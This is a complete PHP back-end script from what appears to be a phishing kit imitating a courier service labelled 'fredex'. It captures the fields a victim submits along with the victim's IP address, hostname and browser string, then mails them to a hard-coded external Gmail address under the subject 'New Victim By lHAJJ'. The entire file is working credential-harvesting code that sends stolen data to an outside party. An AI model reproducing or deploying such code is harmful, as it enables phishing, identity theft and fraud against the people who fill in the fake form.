<?php
$ip = getenv("REMOTE_ADDR");
$message .= "-------------------- fredex -------------------\n";
$message .= "--------------  Infos -------------\n";
$message .= "prenomNom       : ".$_POST['identifier']."\n";
$message .= "Nom      : ".$_POST['juan']."\n";
$message .= "-------------- IP Infos ------------\n";
$message .= "IP      : $ip\n";
$message .= "HOST    : ".gethostbyaddr($ip)."\n";
$message .= "BROWSER : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "---------------------- BY munther ALiraqi ----------------------\n";
$send = "laouziazzedine@gmail.com ";
$subject = "New Victim By lHAJJ ";
$headers = "pedro";  
mail($send,$subject,$message,$headers);
?>
